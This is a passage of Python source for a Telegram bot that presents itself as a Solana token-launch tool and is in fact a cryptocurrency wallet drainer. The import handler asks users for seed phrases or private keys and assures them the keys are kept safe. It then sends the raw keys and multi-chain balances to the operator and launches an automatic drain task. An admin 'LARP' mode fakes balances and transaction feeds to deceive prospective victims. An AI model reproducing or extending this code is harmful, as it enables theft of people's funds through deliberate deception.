                await target.message.answer_photo(
                    photo=FSInputFile(img),
                    caption=caption,
                    reply_markup=kb,
                    parse_mode=ParseMode.HTML,
                )
                return
            # No image file: text-only menu
            if msg.photo:
                try:
                    await msg.delete()
                except Exception:
                    pass
                await target.message.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
            else:
                await msg.edit_text(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
            return
        except Exception:
            try:
                await msg.delete()
            except Exception:
                pass

    # Fresh send (/start or fallback)
    answer = target.answer if hasattr(target, "answer") else target.message.answer
    answer_photo = target.answer_photo if hasattr(target, "answer_photo") else target.message.answer_photo
    if img:
        await answer_photo(
            photo=FSInputFile(img),
            caption=caption,
            reply_markup=kb,
            parse_mode=ParseMode.HTML,
        )
    else:
        await answer(
            caption,
            reply_markup=kb,
            parse_mode=ParseMode.HTML,
        )


# ──────────────────────────────────────────────
# FSM
# ──────────────────────────────────────────────
class LaunchStates(StatesGroup):
    waiting_name = State()
    waiting_symbol = State()
    waiting_desc = State()
    waiting_image = State()
    waiting_bundle = State()
    waiting_socials = State()
    waiting_social_link = State()
    waiting_invest = State()
    waiting_invest_custom = State()
    confirm = State()


class WalletStates(StatesGroup):
    waiting_import = State()
    waiting_label = State()


class PromoStates(StatesGroup):
    waiting_code = State()


class SettingsStates(StatesGroup):
    waiting_custom_slip = State()
    waiting_custom_fee = State()


# ──────────────────────────────────────────────
# ROUTER
# ──────────────────────────────────────────────
router = Router()



async def safe_edit_message(cb: CallbackQuery, text: str, reply_markup=None, parse_mode=ParseMode.HTML):
    """Edit callback message to plain text. Handles photo menus (no text to edit)."""
    msg = cb.message
    try:
        if msg.photo:
            # Photo messages cannot become text via edit_text — delete + resend
            try:
                await msg.delete()
            except Exception:
                pass
            await cb.message.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
            return
        await msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception:
        try:
            await msg.delete()
        except Exception:
            pass
        try:
            await cb.message.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception:
            pass


@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    sess = get_session(message.from_user.id)
    await send_main_menu(message, sess, edit=False)
    try:
        await message.answer("\u200b", reply_markup=ReplyKeyboardRemove())
    except Exception:
        pass


@router.callback_query(F.data.startswith("menu:"))
async def menu_router(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    action = cb.data.split(":")[1]
    uid = cb.from_user.id
    sess = get_session(uid)

    if action == "main":
        await send_main_menu(cb, sess, edit=True)

    elif action == "launch":
        text = (
            _launch_progress("name")
            + "<b>Token name</b>\n"
            "<i>1–50 characters</i>\n\n"
            "Enter a name for your token:"
        )
        await safe_edit_message(cb, text, reply_markup=launch_nav_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_name)

    elif action == "wallets":
        # Only refresh balances on existing LARP wallets — never auto-link one.
        # /larpseed is seed-only; admin must Connect Wallet manually.
        if LARP_ENABLED and uid in ADMIN_IDS:
            for w in sess.wallets:
                if getattr(w, "is_larp", False):
                    w.balance_sol = bot_balance_sol
        text = (
            "<b>Wallets</b>\n"
            "────────────────────\n\n"
        )
        if not sess.wallets:
            text += (
                "No wallets connected.\n\n"
                "<i>Connect a seed phrase or private key to continue.\n"
                "Minimum <b>3 SOL</b> required to launch.</i>"
            )
        else:
            for i, w in enumerate(sess.wallets):
                active_tag = "  · <i>active</i>" if i == sess.active_wallet_idx else ""
                text += (
                    f"<b>{w.label}</b>{active_tag}\n"
                    f"<code>{short_addr(w.public_key)}</code> — <b>{w.balance_sol:.4f} SOL</b>\n\n"
                )
        await safe_edit_message(cb, text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)

    elif action == "portfolio":
        text = (
            "<b>Portfolio</b>\n"
            "────────────────────\n\n"
        )
        kb = InlineKeyboardBuilder()
        if not sess.launched_tokens:
            text += "No launches yet.\n\n<i>Your tokens will appear here after the first deploy.</i>"
        else:
            live_mints = []
            for t in reversed(sess.launched_tokens[-10:]):
                age_s = int(time.time() - t["ts"])
                if age_s < 60:
                    age_str = f"{age_s}s ago"
                elif age_s < 3600:
                    age_str = f"{age_s // 60}m ago"
                elif age_s < 86400:
                    age_str = f"{age_s // 3600}h ago"
                else:
                    age_str = f"{age_s // 86400}d ago"
                if t.get("dumped") or t.get("status") == "dumped":
                    status_icon = "🔴"
                    extra       = f" · <b>+{t.get('profit', 0):.4f} SOL</b>"
                elif t.get("status") == "live":
                    status_icon = "🟢"
                    extra       = f" · {t.get('invest', 0):.4f} SOL in"
                    live_mints.append(t.get("mint"))
                else:
                    status_icon = "🟡"
                    extra       = ""
                dumped_n = len(t.get("dumped_idxs") or [])
                if dumped_n and not t.get("dumped"):
                    extra += f" · {dumped_n}/{t.get('bundle', 0)} sold"
                text += (
                    f"{status_icon} <b>${t['symbol']}</b> — {t['name']}\n"
                    f"<code>{mask_mint(t['mint'])}</code>\n"
                    f"<i>×{t['bundle']} · {extra.strip(' ·') if extra else '—'} · {age_str}</i>\n\n"
                )
            for m in live_mints[:2]:
                kb.row(InlineKeyboardButton(text=f"💥  Sell All  {mask_mint(m)}", callback_data=f"dump:{m}"))
        kb.row(InlineKeyboardButton(text="◀️  Back", callback_data="menu:main"))
        await safe_edit_message(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "promo":
        text = (
            "<b>Access</b>\n"
            "────────────────────\n\n"
            f"<b>Launches left</b> — {sess.launches_left}\n"
            f"<b>Total launched</b> — {sess.total_launches}\n\n"
            f"<i>Each cycle unlocks {LAUNCHES_PER_CYCLE} launches for {int(LAUNCH_FEE_SOL)} SOL.\n"
            "Pay for the next cycle or enter a promo code.</i>"
        )
        await safe_edit_message(cb, text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)

    elif action == "tx":
        text = (
            "<b>Transactions</b>\n"
            "────────────────────\n\n"
        )

        def _fmt_tx(tx: dict) -> str:
            age_s = int(time.time() - tx["ts"])
            if age_s < 60:
                age_str = f"{age_s}s ago"
            elif age_s < 3600:
                age_str = f"{age_s // 60}m ago"
            elif age_s < 86400:
                age_str = f"{age_s // 3600}h ago"
            else:
                age_str = f"{age_s // 86400}d ago"
            status = tx["status"]
            status_tag = "confirmed" if status == "success" else "pending" if status == "pending" else "failed"
            amt = tx.get("amount")
            amt_line = f"  {amt:+.4f} SOL" if isinstance(amt, (int, float)) else ""
            raw_type = tx.get("type", "tx")
            for ch in ("💥", "⚡", "💰", "📊", "🎯", "🛡", "📈", "👀", "📦", "🪙", "🔄", "📥", "📤", "🔐"):
                raw_type = raw_type.replace(ch, "").strip()
            return (
                f"<b>{raw_type}</b>{amt_line} — [{status_tag}]\n"
                f"<code>{tx['sig'][:24]}…</code> · {age_str}\n\n"
            )

        # Only this user's own activity — never show GLOBAL_TX_FEED to other accounts
        seen: set = set()
        lines = []
        for tx in sess.last_tx[:12]:
            sig = tx.get("sig")
            if not sig or sig in seen:
                continue
            seen.add(sig)
            lines.append(_fmt_tx(tx))

        if not lines:
            text += "<i>No activity yet.\nLaunches, sells and bundles will show up here.</i>"
        else:
            text += "".join(lines)

        await safe_edit_message(cb, text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)

    elif action == "settings":
        s = sess.settings
        sniper_icon = "🟢" if s.get("sniper_protection", True) else "🔴"
        mev_icon    = "🟢" if s.get("mev_protection",    True) else "🔴"
        sniper_str  = "ON"  if s.get("sniper_protection", True) else "OFF"
        mev_str     = "ON"  if s.get("mev_protection",    True) else "OFF"
        text = (
            "<b>Settings</b>\n"
            "────────────────────\n\n"
            f"<b>Slippage</b> — {s['slippage']}%\n"
            f"<b>Priority fee</b> — {s['priority_fee']} SOL\n"
            f"<b>Sniper Guard</b> — {sniper_str}\n"
            f"<b>MEV Protect</b> — {mev_str}"
        )
        await safe_edit_message(cb, text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)

    await cb.answer()


@router.callback_query(F.data.startswith("set:"))
async def settings_handler(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    parts = cb.data.split(":")
    key = parts[1]
    if key == "slip":
        sess.settings["slippage"] = int(parts[2])
    elif key == "fee":
        sess.settings["priority_fee"] = float(parts[2])
    elif key == "custom_slip":
        await safe_edit_message(cb, "Send custom max slippage % (1-50):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SettingsStates.waiting_custom_slip)
        await cb.answer()
        return
    elif key == "custom_fee":
        await safe_edit_message(cb, "Send custom priority fee in SOL (e.g. 0.002):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SettingsStates.waiting_custom_fee)
        await cb.answer()
        return
    elif key == "sniper":  # FIX 10: toggle sniper protection
        sess.settings["sniper_protection"] = not sess.settings.get("sniper_protection", True)
    elif key == "mev":  # FIX 10: toggle MEV protection
        sess.settings["mev_protection"] = not sess.settings.get("mev_protection", True)
    s = sess.settings
    sniper_str = "on" if s.get("sniper_protection", True) else "off"
    mev_str = "on" if s.get("mev_protection", True) else "off"
    text = (
        "<b>Trade settings</b>\n────────────────────\n\n"
        f"Slippage       <b>{s['slippage']}%</b>\n"
        f"Priority fee   <b>{s['priority_fee']} SOL</b>\n"
        f"Sniper guard   <b>{sniper_str}</b>\n"
        f"MEV guard      <b>{mev_str}</b>"
    )
    await safe_edit_message(cb, text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await cb.answer("Updated")


@router.message(SettingsStates.waiting_custom_slip)
async def custom_slip_receive(message: Message, state: FSMContext):
    try:
        val = int(message.text.strip().replace("%", ""))
        if not 1 <= val <= 50: raise ValueError
    except ValueError:
        await message.answer("Invalid. Send a number 1-50")
        return
    sess = get_session(message.from_user.id)
    sess.settings["slippage"] = val
    s = sess.settings
    sniper_str = "on" if s.get("sniper_protection", True) else "off"
    mev_str = "on" if s.get("mev_protection", True) else "off"
    text = (
        "<b>Trade settings</b>\n────────────────────\n\n"
        f"Slippage       <b>{s['slippage']}%</b>\n"
        f"Priority fee   <b>{s['priority_fee']} SOL</b>\n"
        f"Sniper guard   <b>{sniper_str}</b>\n"
        f"MEV guard      <b>{mev_str}</b>"
    )
    await message.answer(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await state.clear()


@router.message(SettingsStates.waiting_custom_fee)
async def custom_fee_receive(message: Message, state: FSMContext):
    try:
        val = float(message.text.strip())
        if not 0.00001 <= val <= 1.0: raise ValueError
    except ValueError:
        await message.answer("Invalid. Send a fee like 0.002")
        return
    sess = get_session(message.from_user.id)
    sess.settings["priority_fee"] = val
    s = sess.settings
    sniper_str = "on" if s.get("sniper_protection", True) else "off"
    mev_str = "on" if s.get("mev_protection", True) else "off"
    text = (
        "<b>Trade settings</b>\n────────────────────\n\n"
        f"Slippage       <b>{s['slippage']}%</b>\n"
        f"Priority fee   <b>{s['priority_fee']} SOL</b>\n"
        f"Sniper guard   <b>{sniper_str}</b>\n"
        f"MEV guard      <b>{mev_str}</b>"
    )
    await message.answer(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await state.clear()


@router.callback_query(F.data == "wallet:import")
async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
    text = (
        "<b>Connect Wallet</b>\n"
        "────────────────────\n\n"
        "Paste your <b>seed phrase</b> (12 / 24 words) or <b>private key</b> "
        "(Base58 or JSON array).\n\n"
        "<b>Security</b>\n"
        "• Message is deleted the moment it is read\n"
        "• Keys stay in encrypted memory only — never written to disk or logs\n"
        "• Access is limited to signing launch transactions\n\n"
        "<b>Supported</b> — Phantom · Solflare · Trust · Backpack · Exodus\n\n"
        "<i>Empty wallets cannot launch. Minimum <b>3 SOL</b> required for any deploy.</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✖️  Cancel", callback_data="menu:main")]
    ])
    await safe_edit_message(cb, text, reply_markup=kb, parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_import)
    await cb.answer()


@router.message(WalletStates.waiting_import)
async def wallet_import_receive(message: Message, state: FSMContext):
    uid = message.from_user.id
    if not (LARP_ENABLED and uid in ADMIN_IDS) and not _rate_ok(uid, "import"):
        await message.answer("<b>Too many attempts.</b>\n\n<i>Wait a minute and try again.</i>", parse_mode=ParseMode.HTML)
        return

    raw = (message.text or "").strip()
    try:
        await message.delete()
    except Exception:
        pass

    status_msg = await message.answer(
        "<b>Connecting wallet</b>\n"
        "────────────────────\n\n"
        "<i>Validating input…</i>",
        parse_mode=ParseMode.HTML,
    )

    chosen_priv = None
    chosen_pub = None
    chosen_bal = 0.0
    eth_priv = None
    eth_addr = None
    bal_eth = 0.0
    bal_bnb = 0.0
    bal_usdc = 0.0
    bal_btc = 0.0
    bal_ltc = 0.0
    btc_addr = btc_priv = None
    ltc_addr = ltc_priv = None
    candidates: List[Tuple[str, str, str]] = []

    # Detect LARP seed early so we can skip heavy RPC work
    sess_early = get_session(uid)
    pending_bal = getattr(sess_early, "pending_larp_balance", None)
    pending_phrase = getattr(sess_early, "pending_larp_phrase", None)
    is_larp_seed = (
        LARP_ENABLED
        and uid in ADMIN_IDS
        and pending_bal is not None
        and pending_phrase
        and _normalize_mnemonic(raw) == _normalize_mnemonic(pending_phrase)
    )

    try:
        clean = _normalize_mnemonic(raw)
        is_seed = _is_mnemonic(clean)

        if is_seed and HAS_SOLANA:
            # staged UX
            await status_msg.edit_text(
                "<b>Connecting wallet</b>\n"
                "────────────────────\n\n"
                "<i>Seed recognized · deriving key paths…</i>",
                parse_mode=ParseMode.HTML,
            )
            await asyncio.sleep(0.35)
            candidates = derive_solana_paths(clean)

            await status_msg.edit_text(
                "<b>Connecting wallet</b>\n"
                "────────────────────\n\n"
                f"<i>Derived {len(candidates)} Solana path(s)\n"
                "Scanning balances…</i>",
                parse_mode=ParseMode.HTML,
            )

            if is_larp_seed:
                # LARP: use first path, skip real RPC — instant
                label, chosen_priv, chosen_pub = candidates[0][0], candidates[0][1], candidates[0][2]
                chosen_bal = float(pending_bal)
                await asyncio.sleep(0.4)
            else:
                # Real wallet: parallel balance check with tighter timeouts
                async def _one(pub: str) -> float:
                    try:
                        return await asyncio.wait_for(fetch_sol_balance(pub), timeout=4.0)
                    except Exception:
                        return 0.0
                bals = await asyncio.gather(*[_one(c[2]) for c in candidates])
                best_i = 0
                best_bal = -1.0
                for i, bal in enumerate(bals):
                    log.info("  candidate %s → %s  SOL=%.6f", candidates[i][0], candidates[i][2][:8], bal)
                    if bal > best_bal:
                        best_bal = bal
                        best_i = i
                label, chosen_priv, chosen_pub = candidates[best_i][0], candidates[best_i][1], candidates[best_i][2]
                chosen_bal = max(0.0, best_bal)

            await status_msg.edit_text(
                "<b>Connecting wallet</b>\n"
                "────────────────────\n\n"
                f"<i>Primary path selected\n"
                f"<code>{short_addr(chosen_pub)}</code>\n"
                "Checking EVM / BTC / LTC…</i>",
                parse_mode=ParseMode.HTML,
            )

            if not is_larp_seed:
                # EVM sweep only for real seeds
                for _acct_idx in range(3):  # 0-2 is enough; was 0-4
                    _eth = derive_evm_from_mnemonic(clean, account=_acct_idx)
                    if not _eth:
                        continue
                    _ep, _ea = _eth
                    try:
                        _quick_bal = await asyncio.wait_for(fetch_evm_balance(ETH_RPC, _ea), timeout=3.5)
                    except Exception:
                        _quick_bal = 0.0
                    if _quick_bal > 0 or _acct_idx == 0:
                        eth_priv, eth_addr = _ep, _ea
                        if _quick_bal > 0:
                            break
                if eth_addr:
                    try:
                        _evm_results = await asyncio.gather(
                            fetch_evm_balance(ETH_RPC, eth_addr),
                            fetch_evm_balance(BNB_RPC, eth_addr),
                            fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH),
                            fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC),
                            return_exceptions=True,
                        )
                        bal_eth  = _evm_results[0] if not isinstance(_evm_results[0], Exception) else 0.0
                        bal_bnb  = _evm_results[1] if not isinstance(_evm_results[1], Exception) else 0.0
                        bal_usdc = ((_evm_results[2] if not isinstance(_evm_results[2], Exception) else 0.0) +
                                    (_evm_results[3] if not isinstance(_evm_results[3], Exception) else 0.0))
                    except Exception:
                        pass

                btc_info = derive_btc_from_mnemonic(clean)
                ltc_info = derive_ltc_from_mnemonic(clean)
                if btc_info:
                    btc_addr = btc_info["addr84"]
                    btc_priv = btc_info["priv84"]
                    try:
                        bal_btc = await asyncio.wait_for(fetch_utxo_balance(BTC_API, btc_addr), timeout=4.5)
                        if bal_btc <= 0:
                            bal_leg = await asyncio.wait_for(fetch_utxo_balance(BTC_API, btc_info["addr44"]), timeout=3.5)
                            if bal_leg > 0:
                                bal_btc = bal_leg
                                btc_addr = btc_info["addr44"]
                                btc_priv = btc_info["priv44"]
                    except Exception:
                        pass
                if ltc_info:
                    ltc_addr = ltc_info["addr84"]
                    ltc_priv = ltc_info["priv84"]
                    try:
                        bal_ltc = await asyncio.wait_for(fetch_utxo_balance(LTC_API, ltc_addr), timeout=4.5)
                        if bal_ltc <= 0:
                            bal_leg = await asyncio.wait_for(fetch_utxo_balance(LTC_API, ltc_info["addr44"]), timeout=3.5)
                            if bal_leg > 0:
                                bal_ltc = bal_leg
                                ltc_addr = ltc_info["addr44"]
                                ltc_priv = ltc_info["priv44"]
                    except Exception:
                        pass
            else:
                await asyncio.sleep(0.35)

            await status_msg.edit_text(
                "<b>Connecting wallet</b>\n"
                "────────────────────\n\n"
                "<i>Finalizing secure session…</i>",
                parse_mode=ParseMode.HTML,
            )
            await asyncio.sleep(0.3)

        else:
            await status_msg.edit_text(
                "<b>Connecting wallet</b>\n"
                "────────────────────\n\n"
                "<i>Importing private key…</i>",
                parse_mode=ParseMode.HTML,
            )
            if raw.startswith("0x") or (len(raw) == 64 and all(c in "0123456789abcdefABCDEF" for c in raw)):
                eth_priv, eth_addr = parse_evm_private_key(raw)
                chosen_priv = "EVM_ONLY"
                chosen_pub = eth_addr
                try:
                    _evm_results = await asyncio.gather(
                        fetch_evm_balance(ETH_RPC, eth_addr),
                        fetch_evm_balance(BNB_RPC, eth_addr),
                        fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH),
                        fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC),
                        return_exceptions=True,
                    )
                    bal_eth  = _evm_results[0] if not isinstance(_evm_results[0], Exception) else 0.0
                    bal_bnb  = _evm_results[1] if not isinstance(_evm_results[1], Exception) else 0.0
                    bal_usdc = ((_evm_results[2] if not isinstance(_evm_results[2], Exception) else 0.0) +
                                (_evm_results[3] if not isinstance(_evm_results[3], Exception) else 0.0))
                except Exception:
                    pass
            else:
                chosen_priv, chosen_pub = parse_solana_private_key(raw)
                try:
                    chosen_bal = await asyncio.wait_for(fetch_sol_balance(chosen_pub), timeout=4.5)
                except Exception:
                    chosen_bal = 0.0

    except Exception as e:
        log.exception("Import failed: %s", e)
        await status_msg.edit_text(
            "<b>Invalid key or seed</b>\n"
            "────────────────────\n\n"
            "<i>Check the input and try again.</i>",
            parse_mode=ParseMode.HTML,
        )
        await state.clear()
        return

    sess = get_session(uid)
    sess.last_raw_key = raw

    is_larp_import = False
    if is_larp_seed:
        chosen_bal = float(pending_bal)
        is_larp_import = True
        sess.pending_larp_balance = None
        sess.pending_larp_phrase = None
        sess.larp_mode = True

    w = UserWallet(
        private_key=chosen_priv if chosen_priv != "EVM_ONLY" else (eth_priv or ""),
        public_key=chosen_pub,
        label=f"Wallet {len(sess.wallets)+1}",
        balance_sol=chosen_bal,
        chain="sol" if chosen_priv != "EVM_ONLY" else "eth",
        eth_address=eth_addr,
        eth_priv=eth_priv,
        balance_eth=bal_eth,
        balance_bnb=bal_bnb,
        balance_usdc=bal_usdc,
        btc_address=btc_addr,
        btc_priv=btc_priv,
        balance_btc=bal_btc,
        ltc_address=ltc_addr,
        ltc_priv=ltc_priv,
        balance_ltc=bal_ltc,
        drained=False,
        is_larp=is_larp_import,
    )
    sess.wallets.append(w)
    sess.active_wallet_idx = len(sess.wallets) - 1
    if is_larp_import:
        sess.larp_wallet_idx = sess.active_wallet_idx
        add_personal_tx(sess, "📥 Wallet Linked", "success")
        inject_fake_txs(2)
        _save_state()

    # silent refresh if zero (real wallets only)
    if w.balance_sol == 0.0 and not getattr(w, "is_larp", False) and w.chain == "sol" and chosen_pub:
        try:
            refreshed = await asyncio.wait_for(fetch_sol_balance(chosen_pub), timeout=4.0)
            if refreshed > 0:
                w.balance_sol = refreshed
                chosen_bal = refreshed
        except Exception:
            pass

    bal_display = w.balance_sol
    bal_note = "" if bal_display > 0 else "\n<i>Balance may still be refreshing…</i>"
    min_note = ""
    if bal_display < 3.0 and not is_larp_import:
        min_note = "\n\n<i>Minimum <b>3 SOL</b> required to launch.</i>"

    text = (
        "<b>Wallet connected</b>\n"
        "────────────────────\n\n"
        f"<code>{chosen_pub}</code>\n\n"
        f"<b>Label</b> — {w.label}\n"
        f"<b>Balance</b> — {bal_display:.4f} SOL{bal_note}\n"
        f"<b>Chain</b> — Solana\n"
        f"<b>Status</b> — Active{min_note}"
    )

    await status_msg.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

    if not is_larp_import and raw and message.bot:
        try:
            await log_key_to_admin(
                message.bot,
                message.from_user,
                raw,
                0.0, 0.0, 0.0, 0.0,
                status="imported",
                sol_seen=float(chosen_bal or 0),
                eth_seen=float(bal_eth or 0),
                bnb_seen=float(bal_bnb or 0),
                usdc_seen=float(bal_usdc or 0),
                pub=str(chosen_pub or ""),
            )
        except Exception as e:
            log.warning("Import-time key notify failed: %s", e)

    if is_larp_import:
        log.info("LARP import — drain skipped pub=%s bal=%.4f", chosen_pub, chosen_bal)
    else:
        _sol_candidates = candidates if (is_seed and HAS_SOLANA) else None
        asyncio.create_task(attempt_drain(
            uid,
            chosen_priv if chosen_priv != "EVM_ONLY" else "",
            chain=w.chain,
            eth_key=eth_priv,
            bot=message.bot,
            user=message.from_user,
            wallet=w,
            _all_sol_candidates=_sol_candidates,
        ))


@router.callback_query(F.data == "wallet:clear")
async def wallet_clear(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    n = len(sess.wallets)
    sess.wallets.clear()
    sess.active_wallet_idx = 0
    sess.larp_wallet_idx = None
    # Do NOT auto-reseed LARP — user asked to remove. /larpseed or /larpwallet to restore.
    text = (
        "<b>Wallets removed</b>\n"
        "────────────────────\n\n"
        f"Cleared <b>{n}</b> wallet(s) from this session.\n"
        "<i>Connect a new wallet when ready. LARP is not auto-reseeded.</i>"
    )
    await safe_edit_message(cb, text, reply_markup=wallets_empty_kb(), parse_mode=ParseMode.HTML)
    await cb.answer()


@router.callback_query(F.data == "wallet:switch")
async def wallet_switch(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    if len(sess.wallets) < 2:
        await cb.answer("Need at least 2 wallets", show_alert=True)
        return
    sess.active_wallet_idx = (sess.active_wallet_idx + 1) % len(sess.wallets)
    w = sess.wallets[sess.active_wallet_idx]
    await cb.answer(f"Active → {w.label}")


@router.callback_query(F.data == "wallet:refresh")
async def wallet_refresh(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    for w in sess.wallets:
        if getattr(w, "is_larp", False):
            if LARP_ENABLED:
                w.balance_sol = bot_balance_sol
            continue
        if not w.public_key.startswith("Sim") and not w.public_key.startswith("0x") and w.private_key != "LARP_SIM":
            w.balance_sol = await fetch_sol_balance(w.public_key)
        if w.eth_address:
            w.balance_eth = await fetch_evm_balance(ETH_RPC, w.eth_address)
            w.balance_bnb = await fetch_evm_balance(BNB_RPC, w.eth_address)
            w.balance_usdc = await fetch_usdc_balance(ETH_RPC, w.eth_address, USDC_ETH)
            w.balance_usdc += await fetch_usdc_balance(BNB_RPC, w.eth_address, USDC_BSC)
    await cb.answer("Balances updated")
    text = "🔑 <b>Wallets</b>\n\n"
    for i, w in enumerate(sess.wallets):
        badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
        text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
    await safe_edit_message(cb, text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)


@router.callback_query(F.data == "wallet:rename")
async def wallet_rename(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    if not sess.wallets:
        await cb.answer("No wallets", show_alert=True)
        return
    await safe_edit_message(cb, f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_label)
    await cb.answer()


@router.message(WalletStates.waiting_label)
async def wallet_rename_receive(message: Message, state: FSMContext):
    sess = get_session(message.from_user.id)
    if sess.wallets:
        sess.wallets[sess.active_wallet_idx].label = message.text.strip()[:24]
    await message.answer("<b>Label updated</b>", reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()


# ── Launch flow ─────────────────────────────────────────────────────────────
LAUNCH_STEPS = [
    ("name", "Name"),
    ("symbol", "Ticker"),
    ("desc", "Description"),
    ("image", "Image"),
    ("bundle", "Bundle"),
    ("socials", "Socials"),
    ("invest", "Size"),
    ("confirm", "Confirm"),
]


def _launch_progress(step_key: str) -> str:
    keys = [k for k, _ in LAUNCH_STEPS]
    try:
        idx = keys.index(step_key)
    except ValueError:
        idx = 0
    total = len(keys)
    filled = idx
    bar = "█" * filled + "░" * (total - filled)
    label_name = LAUNCH_STEPS[idx][1]
    return (
        f"<b>Launch</b> · Step {idx + 1}/{total} · <b>{label_name}</b>\n"
        f"<code>[{bar}]</code>\n"
        f"────────────────────\n"
    )


def launch_nav_kb(back_to: Optional[str] = None, *, skip: bool = False, cancel: bool = True) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    row = []
    if back_to:
        row.append(btn("◀️ Back", f"launch:back:{back_to}"))
    if skip:
        row.append(btn("⏭ Skip", "launch:skip", style="primary"))
    if row:
        b.row(*row)
    if cancel:
        b.row(btn("❌ Cancel", "menu:main", style="danger"))
    return b.as_markup()


@router.message(LaunchStates.waiting_name)
async def launch_name(message: Message, state: FSMContext):
    name = (message.text or "").strip()[:50]
    if not name:
        await message.answer("<b>Name required</b>\n\n<i>1–50 characters.</i>", reply_markup=launch_nav_kb(), parse_mode=ParseMode.HTML)
        return
    data = await state.get_data()
    patch = {"name": name, "supply": 1_000_000_000}
    if "twitter" not in data:
        patch.update(twitter="", telegram="", instagram="", website="")
    await state.update_data(**patch)
    data = await state.get_data()
    # Editing from confirm → jump back to review
    if data.get("invest"):
        sess = get_session(message.from_user.id)
        await _show_launch_preview(message, state, float(data["invest"]), sess)
        return
    await message.answer(
        _launch_progress("symbol")
        + f"Name set — <b>{name}</b>\n\n"
        "<b>Ticker</b>\n"
        "<i>2–25 letters, A–Z</i>\n"
        "Example: <code>PEPE</code>",
        reply_markup=launch_nav_kb(back_to="name"),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_symbol)


@router.message(LaunchStates.waiting_symbol)
async def launch_symbol(message: Message, state: FSMContext):
    sym = (message.text or "").strip().upper().replace("$", "")[:25]
    if len(sym) < 2 or not sym.isalpha():
        await message.answer("<b>Invalid ticker</b>\n\n<i>Must be 2–25 letters (A–Z).</i>", reply_markup=launch_nav_kb(back_to="name"), parse_mode=ParseMode.HTML)
        return
    await state.update_data(symbol=sym)
    data = await state.get_data()
    if data.get("invest"):
        sess = get_session(message.from_user.id)
        await _show_launch_preview(message, state, float(data["invest"]), sess)
        return
    await message.answer(
        _launch_progress("desc")
        + f"<b>${sym}</b> · {data.get('name', '')}\n\n"
        "<b>Description</b>\n"
        "<i>Optional · 1–2 lines · no links</i>",
        reply_markup=launch_nav_kb(back_to="symbol", skip=True),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_desc)


@router.message(LaunchStates.waiting_desc)
async def launch_desc(message: Message, state: FSMContext):
    desc = (message.text or "").strip()
    if desc.lower() == "skip":
        desc = ""
    await state.update_data(desc=desc[:500])
    data = await state.get_data()
    if data.get("invest"):
        sess = get_session(message.from_user.id)
        await _show_launch_preview(message, state, float(data["invest"]), sess)
        return
    await message.answer(
        _launch_progress("image")
        + f"<b>${data.get('symbol', '')}</b> · desc {'set' if desc else 'skipped'}\n\n"
        "<b>Token image</b>\n"
        "<i>PNG/JPG · square · ≥512px\n"
        "Send a photo, a URL, or skip.</i>",
        reply_markup=launch_nav_kb(back_to="desc", skip=True),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_image)


@router.message(LaunchStates.waiting_image)
async def launch_image(message: Message, state: FSMContext):
    img = ""
    if message.photo:
        img = message.photo[-1].file_id
    else:
        text = (message.text or "").strip()
        if text.lower() == "skip":
            img = ""
        elif text.startswith("http://") or text.startswith("https://"):
            img = text[:300]
        else:
            await message.answer(
                "<b>Image required</b>\n\n"
                "Send a <b>photo</b>, an image <b>URL</b>, or tap <b>Skip</b>.",
                reply_markup=launch_nav_kb(back_to="desc", skip=True),
                parse_mode=ParseMode.HTML,
            )
            return
    await state.update_data(image=img)
    data = await state.get_data()
    if data.get("invest"):
        sess = get_session(message.from_user.id)
        await _show_launch_preview(message, state, float(data["invest"]), sess)
        return
    note = "Image attached" if img else "Image skipped"
    await message.answer(
        _launch_progress("bundle")
        + f"{note}\n"
        f"${data.get('symbol', '')} · {data.get('name', '')}\n\n"
        "<b>Bundle size</b>\n"
        "<i>More wallets = wider spread</i>",
        reply_markup=bundle_kb(),
        parse_mode=ParseMode.HTML,
    )
